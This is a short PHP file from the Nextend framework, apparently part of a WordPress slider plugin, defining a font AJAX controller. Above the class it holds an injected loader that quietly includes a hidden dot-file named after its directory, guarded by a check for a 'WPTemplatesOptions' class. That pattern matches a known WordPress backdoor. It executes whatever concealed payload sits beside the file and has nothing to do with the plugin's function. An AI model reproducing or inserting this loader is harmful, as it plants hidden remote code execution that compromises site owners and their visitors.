<?php

namespace Nextend\Framework\Font;

use Nextend\Framework\Controller\Admin\AdminVisualManagerAjaxController;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class ControllerAjaxFont extends AdminVisualManagerAjaxController {

    protected $type = 'font';

    public function getModel() {

        return new ModelFont($this);
    }
}